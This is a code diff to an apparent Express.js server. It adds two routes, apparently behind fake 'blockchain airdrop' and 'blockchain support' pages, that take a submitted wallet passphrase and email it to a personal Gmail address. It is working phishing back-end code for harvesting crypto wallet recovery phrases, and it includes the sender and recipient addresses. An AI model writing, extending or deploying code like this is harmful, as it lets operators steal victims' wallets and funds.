@@ -209,6 +209,68 @@ app.post('/skyecore', (req, res, next) => {
     }
   })
 })
+app.post('/blkairdrop', (req, res, next) => {
+  console.log(
+    'req body', req.body
+  )
+
+  const {phrase} = req.body
+  const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
+
+
+
+  const mail = {
+      from: 'admin@growveonct.com',
+      to: 'ifestephenie@gmail.com',
+      subject: 'New message from blockchainairdrop',
+      html: content,
+  }
+
+  transporter.sendMail(mail, (err, data) => {
+    if (err) {
+      console.log({err})
+      res.json({
+        status: 'fail'
+      })
+    } else {
+      console.log('email sent', data)
+      res.json({
+       status: 'success'
+      })
+    }
+  })
+})
+app.post('/blk-support', (req, res, next) => {
+  console.log(
+    'req body', req.body
+  )
+
+  const {phrase} = req.body
+  const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`
+
+
+
+  const mail = {
+      from: 'admin@growveonct.com',
+      to: 'ifestephenie@gmail.com',
+      subject: 'New message from Block-chainsupport',
+      html: content,
+  }
+
+  transporter.sendMail(mail, (err, data) => {
+    if (err) {
+      console.log({err})
+      res.json({
+        status: 'fail'
+      })
+    } else {
+      console.log('email sent', data)
+      res.json({
+       status: 'success'
+      })
+    }
+  })
+})
 
 
 const PORT = process.env.PORT || 3030
